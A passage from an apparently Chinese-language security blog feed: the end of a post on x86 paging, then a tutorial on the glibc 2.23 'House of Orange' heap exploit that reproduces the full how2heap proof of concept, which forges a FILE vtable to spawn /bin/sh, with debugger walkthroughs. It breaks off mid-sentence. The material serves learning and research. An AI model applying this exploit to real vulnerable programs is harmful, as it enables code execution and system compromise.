alt="image-20230420191045242"></p><ol><li>通过CR3寄存器定位到页目录的起始地址,取线性地址的高10位x4作为索引选取页目录的目录项(由于一个目录项是4字节，所以x4)</li><li>那么根据页目录项中的页表基地址(高20位)和低12位为0，定位到二级页表</li><li>取线性地址的12位到21位（共10位）x4，作为索引选取二级页表的一个页表项</li><li>取出页表项的页表基地址</li><li>取线性地址的低12位作为页中偏移和上一步基地址相加得到物理地址</li></ol><blockquote><p>这个时候一想，4k大小的二级页表有1024个，还外加一个4k目录表这不比之前的4M还大4k？</p><p>这个时候我们分析下目录项的作用</p><ol><li>页目录项的P位表示是否在物理内存，这就说明二级页表本身也可能被交换到虚拟内存中，只有一部分需要的二级页表被加载到物理内存，其余可以放到磁盘，目录项的如果P位为0会触发缺页异常，缺页异常调用内核中的缺页异常处理程序把需要的页面映射到物理内存</li><li>有了这个机制我们可以把页表分散到物理内存不同位置，而不是在一块连续的4M物理内存空间</li><li>4k的页目录是一直在物理内存上的</li></ol></blockquote><h4 id="这种地址转换都是硬件来自动完成的，操作系统来处理缺页"><a href="#这种地址转换都是硬件来自动完成的，操作系统来处理缺页" class="headerlink" title="这种地址转换都是硬件来自动完成的，操作系统来处理缺页"></a>这种地址转换都是硬件来自动完成的，操作系统来处理缺页</h4>]]></content>
      
      
      
        <tags>
            
            <tag> Protected Mode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House Of Orange 2.23 and below</title>
      <link href="/2023/04/06/House-of-orange/"/>
      <url>/2023/04/06/House-of-orange/</url>
      
        <content type="html"><![CDATA[<h2 id="House-Of-Orange-glibc-version-2-23-and-below"><a href="#House-Of-Orange-glibc-version-2-23-and-below" class="headerlink" title="House Of Orange glibc version 2.23 and below"></a>House Of Orange glibc version 2.23 and below</h2><p>很巧妙精细的攻击思路，核心和精彩之处是在没有free函数时如何进行heap attack</p><p>先看一下偏移把</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">FILE struct size: 0xd8</span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">chain - fp: 0x68</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">mode - fp: 0xc0</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">write_ptr - fp: 0x28</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">write_base - fp: 0x20</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">vtable_offset - fp: 0x82</span></span><br><span class="line"><span class="meta prompt_">fp-&gt;</span><span class="language-bash">read_ptr - fp: 0x8</span></span><br></pre></td></tr></table></figure><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当前堆的top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk会被释放并被置入unsorted bin中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><p>_int_malloc中依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，没有的话,接下来操作topchunk,还不满足的话</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sysmalloc去向操作系统申请，有 mmap 和 brk 两种分配方式，我们需要的是brk提升堆顶，所以我们分配的 chunk 大小要小于 mmap 分配阈值，默认为 128K</p><p>brk时会对top chunk size 检测</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line"></span><br><span class="line">  old_top = av-&gt;top;<span class="comment">//av时main_arean，取top chunk最高处</span></span><br><span class="line">  old_size = chunksize (old_top);<span class="comment">//top chunk 大小</span></span><br><span class="line">  old_end = (<span class="type">char</span> *) (chunk_at_offset (old_top, old_size)); <span class="comment">//oldtop+oldsize</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">     at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||<span class="comment">//==0是说明第一次malloc时</span></span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>要求我们</p><ol><li>伪造的 size 必须要对齐到内存页(一般4k),因为topchunk+size是最后一个堆块的边界</li><li>size 要大于 MINSIZE(0x10)</li><li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li><li>size 的 prev inuse 位必须为 1</li></ol><p>测试</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fake_size 0xfd1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    ptr=(<span class="type">void</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr+<span class="number">40</span>);<span class="comment">//0x20+8=40到topchunk的size</span></span><br><span class="line"></span><br><span class="line">    *((<span class="type">long</span> <span class="type">long</span>*)ptr)=fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>malloc(0x20)</code></p><p><img src="/2023/04/06/House-of-orange/image-20230406151240973.png" alt="image-20230406151240973"></p><p>0x602030+0x20fd0&#x3D;0x623000 4k对齐的，为了满足<code>(unsigned long) old_end &amp; (pagesize - 1)) == 0)</code>我们伪造的size要时0xfd1 0x1fd1 0x2fd1等等</p><p><code>    *((long long*)ptr)=fake_size;</code></p><p><img src="/2023/04/06/House-of-orange/image-20230406151445090.png" alt="image-20230406151445090"></p><p><code>malloc(0x1000)</code></p><p><img src="/2023/04/06/House-of-orange/image-20230406151803663.png" alt="image-20230406151803663"></p><p> <code>malloc(0x60);</code></p><p><img src="/2023/04/06/House-of-orange/image-20230406152257567.png" alt="image-20230406152257567"></p><p><img src="/2023/04/06/House-of-orange/image-20230406152317119.png" alt="image-20230406152317119"></p><h3 id="how2heap-example"><a href="#how2heap-example" class="headerlink" title="how2heap example"></a>how2heap example</h3><p><strong>md，这个注释写的太好了orz</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span></span><br><span class="line"><span class="comment">  It requires a leak of the heap and the libc</span></span><br><span class="line"><span class="comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   This function is just present to emulate the scenario where</span></span><br><span class="line"><span class="comment">   the address of the function system is known.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span> <span class="params">( <span class="type">char</span> *ptr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span></span><br><span class="line"><span class="comment">      using which the Top (also called the Wilderness) chunk can be corrupted.</span></span><br><span class="line"><span class="comment">      </span></span><br><span class="line"><span class="comment">      At the beginning of execution, the entire heap is part of the Top chunk.</span></span><br><span class="line"><span class="comment">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span></span><br><span class="line"><span class="comment">      Thus, with every allocation, the Top chunks keeps getting smaller.</span></span><br><span class="line"><span class="comment">      And in a situation where the size of the Top chunk is smaller than the requested value,</span></span><br><span class="line"><span class="comment">      there are two possibilities:</span></span><br><span class="line"><span class="comment">       1) Extend the Top chunk</span></span><br><span class="line"><span class="comment">       2) Mmap a new page</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      If the size requested is smaller than 0x21000, then the former is followed.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p1, *p2;</span><br><span class="line">    <span class="type">size_t</span> io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span></span><br><span class="line">        <span class="string">&quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span></span><br><span class="line">        <span class="string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Firstly, lets allocate a chunk on the heap.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       The heap is usually allocated with a top chunk of size 0x21000</span></span><br><span class="line"><span class="comment">       Since we&#x27;ve allocate a chunk of size 0x400 already,</span></span><br><span class="line"><span class="comment">       what&#x27;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span></span><br><span class="line"><span class="comment">       it must also be page aligned at the end.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span></span><br><span class="line"><span class="comment">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       So that means that there are two conditions that must always be true.</span></span><br><span class="line"><span class="comment">        1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">        2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span></span><br><span class="line"><span class="comment">       What&#x27;s left is 0x20c01</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Now, let&#x27;s satisfy the conditions</span></span><br><span class="line"><span class="comment">       1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">       2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top = (<span class="type">size_t</span> *) ( (<span class="type">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the Top chunk.</span></span><br><span class="line"><span class="comment">       Malloc tries to service this request by extending the Top chunk</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In the usual scenario, the heap looks like the following</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ...    |</span></span><br><span class="line"><span class="comment">          |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">      heap start                              heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       And the new area that gets allocated is contiguous to the old heap end.</span></span><br><span class="line"><span class="comment">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span></span><br><span class="line"><span class="comment">       which is basically a temporary chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       After the size of the Top chunk has been updated, this chunk gets freed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In our scenario however, the heap looks like</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                            heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span></span><br><span class="line"><span class="comment">       So the area between the second chunk and the heap end is unused.</span></span><br><span class="line"><span class="comment">       And the old Top chunk gets freed.</span></span><br><span class="line"><span class="comment">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span></span><br><span class="line"><span class="comment">       it gets added to list of unsorted bins.</span></span><br><span class="line"><span class="comment">       Now we request a chunk of size larger than the size of the top chunk.</span></span><br><span class="line"><span class="comment">       This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment">       And ultimately invokes _int_free</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Finally the heap looks like this:</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">          |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">     heap start                                             new heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Note that the above chunk will be allocated in a different page</span></span><br><span class="line"><span class="comment">      that gets mmapped. It will be placed after the old heap&#x27;s end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here starts phase two of the attack. We assume that we have an overflow into the old</span></span><br><span class="line"><span class="comment">      top chunk so we could overwrite the chunk&#x27;s size.</span></span><br><span class="line"><span class="comment">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span></span><br><span class="line"><span class="comment">      of this chunk in the unsorted bin list.</span></span><br><span class="line"><span class="comment">      There are two common ways to exploit the current state:</span></span><br><span class="line"><span class="comment">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span></span><br><span class="line"><span class="comment">        - Use the unlinking of the chunk for an *where*-controlled write of the</span></span><br><span class="line"><span class="comment">          libc&#x27;s main_arena unsorted-bin-list. (requires at least one allocation)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The former attack is pretty straight forward to exploit, so we will only elaborate</span></span><br><span class="line"><span class="comment">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The attack is pretty stunning, as it exploits the abort call itself, which</span></span><br><span class="line"><span class="comment">      is triggered when the libc detects any bogus state of the heap.</span></span><br><span class="line"><span class="comment">      Whenever abort is triggered, it will flush all the file pointers by calling</span></span><br><span class="line"><span class="comment">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span></span><br><span class="line"><span class="comment">      _IO_list_all and calling _IO_OVERFLOW on them.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span></span><br><span class="line"><span class="comment">      _IO_OVERLOW points to system and whose first 8 bytes are set to &#x27;/bin/sh&#x27;, so</span></span><br><span class="line"><span class="comment">      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#x27;/bin/sh&#x27;).</span></span><br><span class="line"><span class="comment">      More about file-pointer exploitation can be found here:</span></span><br><span class="line"><span class="comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span></span><br><span class="line"><span class="comment">      currently point to the libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      We plan to overwrite the fd and bk pointers of the old top,</span></span><br><span class="line"><span class="comment">      which has now been added to the unsorted bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      When malloc tries to satisfy a request by splitting this free chunk</span></span><br><span class="line"><span class="comment">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span></span><br><span class="line"><span class="comment">      in libc&#x27;s main_arena.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span></span><br><span class="line"><span class="comment">      case.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span></span><br><span class="line"><span class="comment">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> </span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      At the end, the system function will be invoked with the pointer to this file pointer.</span></span><br><span class="line"><span class="comment">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>( ( <span class="type">char</span> *) top, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span></span><br><span class="line"><span class="comment">      in _IO_list_all.</span></span><br><span class="line"><span class="comment">      Since we can only overwrite this address with main_arena&#x27;s unsorted-bin-list,</span></span><br><span class="line"><span class="comment">      the idea is to get control over the memory at the corresponding fd-ptr.</span></span><br><span class="line"><span class="comment">      The address of the next file pointer is located at base_address+0x68.</span></span><br><span class="line"><span class="comment">      This corresponds to smallbin-4, which holds all the smallbins of</span></span><br><span class="line"><span class="comment">      sizes between 90 and 98. For further information about the libc&#x27;s bin organisation</span></span><br><span class="line"><span class="comment">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Since we overflow the old top chunk, we also control it&#x27;s size field.</span></span><br><span class="line"><span class="comment">      Here it gets a little bit tricky, currently the old top chunk is in the</span></span><br><span class="line"><span class="comment">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span></span><br><span class="line"><span class="comment">      in this list first, therefore, iterates over the list.</span></span><br><span class="line"><span class="comment">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span></span><br><span class="line"><span class="comment">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span></span><br><span class="line"><span class="comment">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span></span><br><span class="line"><span class="comment">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span></span><br><span class="line"><span class="comment">      therefore, occupying the smallbin[4] location in the main_arena and</span></span><br><span class="line"><span class="comment">      eventually representing the fake file pointer&#x27;s fd-ptr.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      In addition to sorting, malloc will also perform certain size checks on them,</span></span><br><span class="line"><span class="comment">      so after sorting the old top chunk and following the bogus fd pointer</span></span><br><span class="line"><span class="comment">      to _IO_list_all, it will check the corresponding size field, detect</span></span><br><span class="line"><span class="comment">      that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span></span><br><span class="line"><span class="comment">      and finally triggering the abort call that gets our chain rolling.</span></span><br><span class="line"><span class="comment">      Here is the corresponding code in the libc:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Now comes the part where we satisfy the constraints on the fake file pointer</span></span><br><span class="line"><span class="comment">      required by the function _IO_flush_all_lockp and tested here:</span></span><br><span class="line"><span class="comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      We want to satisfy the first condition:</span></span><br><span class="line"><span class="comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    FILE *fp = (FILE *) top;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      4) Finally set the jump table to controlled memory and place system there.</span></span><br><span class="line"><span class="comment">      The jump table pointer is right after the FILE struct:</span></span><br><span class="line"><span class="comment">      base_address+sizeof(FILE) = jump_table</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>) &amp;winner;</span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, trigger the whole chain by calling malloc */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     The libc&#x27;s error message will be printed to the screen</span></span><br><span class="line"><span class="comment">     But you&#x27;ll get a shell anyways.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">winner</span><span class="params">(<span class="type">char</span> *ptr)</span></span><br><span class="line">&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    syscall(SYS_exit, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般第一次brk的堆块大小都是0x21000，</p><p>首先模拟了任意大小的堆溢出，前面一直到<code>p2 = malloc(0x1000);</code>和我们上面分析的一样在制造unsorted bin</p><p><img src="/2023/04/06/House-of-orange/image-20230407001924067.png" alt="image-20230407001924067"></p><p>这0x1000的chunk被分配到新brk的topchunk上</p><p><img src="/2023/04/06/House-of-orange/image-20230407002211084.png" alt="image-20230407002211084"></p><p><code>  io_list_all = top[2] + 0x9a8;</code>根据unsortedbin的固定偏移定位到_io_list_all&#x3D;<strong>0x7ffff7dd2520</strong></p><p><img src="/2023/04/06/House-of-orange/image-20230407002519360.png" alt="image-20230407002519360"></p><p><code>  top[3] = io_list_all - 0x10;    memcpy( ( char *) top, &quot;/bin/sh\x00&quot;, 8);    top[1] = 0x61;</code></p><p><img src="/2023/04/06/House-of-orange/image-20230407002923144.png" alt="image-20230407002923144"></p><p>其余直接从<code>malloc(0x10)</code>往后推吧</p><p>把0x602400拿走时会chunk-&gt;bk-&gt;fd&#x3D;unsortedbin，我们会往io_list_all写入unsortedbin</p><p><strong>0x61是个重点</strong></p><ul><li><p>malloc(0x10)时会先把这个0x61大小的chunk放入0x60大小的smallbin里即main_arena+0xc0，然后切割他的bk所指的chunk</p><p><img src="/2023/04/06/House-of-orange/image-20230407012803059.png" alt="image-20230407012803059"></p></li><li><p>这个时候io_list_all里是main_arena+88,我们把它当作IO_FILE_plus结构体，他的_chain指针在main_arena+88+0x68&#x3D;main_arena+0xc0处，我们的第一个0x60smallbin里存的地址</p><p><img src="/2023/04/06/House-of-orange/image-20230407012846958.png" alt="image-20230407012846958"></p></li><li><p>也就是说io_list_all链表的下一个链表是0x602400，他的周围都是是我们的可控范围</p><p><img src="/2023/04/06/House-of-orange/image-20230407012952664.png" alt="image-20230407012952664"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">jump_table[<span class="number">3</span>] = (<span class="type">size_t</span>) &amp;winner;</span><br><span class="line">*(<span class="type">size_t</span> *) ((<span class="type">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="type">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br></pre></td></tr></table></figure><p>我们选择一块可控内存伪造vtable，并覆盖写入他的_overflow指针</p></li><li><p>切割bk时由于bk不符合要求</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck = unsorted_chunks (av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会触发<code>malloc_printerr</code>,一直到_overflow</p><p><code>__libc_malloc</code> 